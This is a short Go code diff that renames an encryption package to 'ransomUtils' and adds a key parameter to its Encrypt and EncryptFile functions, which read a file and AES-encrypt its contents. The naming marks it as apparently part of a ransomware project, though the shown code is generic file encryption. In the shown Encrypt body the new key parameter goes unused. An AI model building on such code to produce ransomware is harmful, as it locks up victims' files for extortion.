@@ -1,4 +1,4 @@
-package encript
+package ransomUtils
 
 import (
 	"bytes"
@@ -17,7 +17,7 @@ func deriveKey(password string) []byte {
 	return hash[:]
 }
 
-func Encrypt(plaintext string) (string, error) {
+func Encrypt(plaintext string, pKey string) (string, error) {
 	block, err := aes.NewCipher(deriveKey(key))
 	if err != nil {
 		return "", err
@@ -38,13 +38,13 @@ func Encrypt(plaintext string) (string, error) {
 	return base64.StdEncoding.EncodeToString(out), nil
 }
 
-func EncryptFile(path string) error {
+func EncryptFile(path string, pKey string) error {
 	data, err := os.ReadFile(path)
 	if err != nil {
 		return fmt.Errorf("error al leer el archivo: %w", err)
 	}
 
-	encrypted, err := Encrypt(string(data))
+	encrypted, err := Encrypt(string(data), pKey)
 	if err != nil {
 		return fmt.Errorf("error al cifrar: %w", err)
 	}
